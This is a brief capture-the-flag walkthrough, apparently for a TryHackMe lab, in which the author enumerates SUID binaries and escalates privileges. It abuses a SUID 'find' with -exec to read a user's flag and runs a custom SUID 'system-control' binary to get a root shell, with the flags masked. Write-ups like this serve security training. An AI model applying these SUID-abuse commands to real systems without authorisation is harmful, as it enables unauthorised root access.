## Found flag1
```
$ find / -user igor 2>/dev/null | xargs ls -l  2>/dev/null
-rw------- 1 igor igor      89 Dec  7  2019 /home/igor/.bash_history
-r-------- 1 igor igor      38 Dec  7  2019 /home/igor/flag1.txt
-rw------- 1 igor igor     604 Dec  7  2019 /home/igor/.viminfo
-rwsr-xr-x 1 igor igor  221768 Feb  7  2016 /usr/bin/find
-rwsr-xr-x 1 igor igor 2770528 Mar 31  2016 /usr/bin/nmap

/home/igor:
total 4
-r-------- 1 igor igor 38 Dec  7  2019 flag1.txt
$ find / -executable -user igor 2>/dev/null
...
/usr/bin/find
/usr/bin/nmap
/home/igor
$ /usr/bin/find . -exec cat /home/igor/flag1.txt \;
THM{XXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

## Found root flag
```
$ find / -user root -perm -4000 2>/dev/null
...
/usr/bin/system-control  # not common binary
$ /usr/bin/system-control

===== System Control Binary =====

Enter system command: /bin/bash
# cat /root/flag2.txt
THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
